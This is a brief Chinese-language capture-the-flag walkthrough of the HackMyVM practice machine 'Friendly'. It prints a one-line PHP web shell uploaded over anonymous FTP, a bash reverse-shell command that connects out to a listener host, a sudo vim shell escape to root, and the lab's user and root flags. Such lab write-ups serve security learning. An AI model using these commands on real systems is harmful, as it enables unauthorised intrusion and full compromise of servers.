# Friendly

2025.02.22 https://hackmyvm.eu/machines/machine.php?vm=Friendly

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

ftp 允许匿名登陆，有一个文件 index.html 就是 apache 的默认主页，同时发现匿名用户有上传文件 777 权限，直接上传 php 一句话脚本，然后反弹 shell 获得权限：

```
<?php system($_GET[1]);?>

curl -G --data-urlencode '1=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://192.168.5.40/shell.php
```

发现系统中有用户 RiJaba1 并且能读取 user flag:

```
www-data@friendly:/home/RiJaba1$ cat user.txt
b8cff8c9008e1c98a1f2937b4475acd6
```

并且 sudo -l 显示 (ALL : ALL) NOPASSWD: /usr/bin/vim 直接提权到 root：

```
sudo vim -c ':!/bin/sh'
```

经过寻找在这里找到了 root flag：

```
root@friendly:/# cat /var/log/apache2/root.txt
66b5c58f3e83aff307441714d3e28d2f
```
